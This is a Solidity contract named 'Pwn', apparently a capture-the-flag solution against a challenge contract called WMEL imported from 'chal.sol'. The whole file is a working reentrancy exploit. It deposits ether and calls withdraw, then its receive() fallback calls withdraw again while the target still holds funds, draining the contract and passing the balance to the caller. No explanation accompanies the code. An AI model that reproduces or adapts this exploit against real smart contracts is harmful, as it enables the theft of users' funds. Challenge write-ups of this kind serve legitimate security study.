// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./chal.sol";


contract Pwn {
    WMEL factory;

    constructor (WMEL _factory)
    {
        factory = WMEL(address(_factory));
    }

    function getBalance() public view returns (uint)
    {
        return factory.getBalance();
    }

    function run() public payable
    {
        factory.deposit{ value: msg.value }();
        factory.withdraw();
    }

    receive () external payable 
    {
        if ( address(factory).balance > 0 )
        {
            factory.withdraw();
        }
    }

    function withdraw () public
    {
        msg.sender.call{ value: address(this).balance }("");
    }

}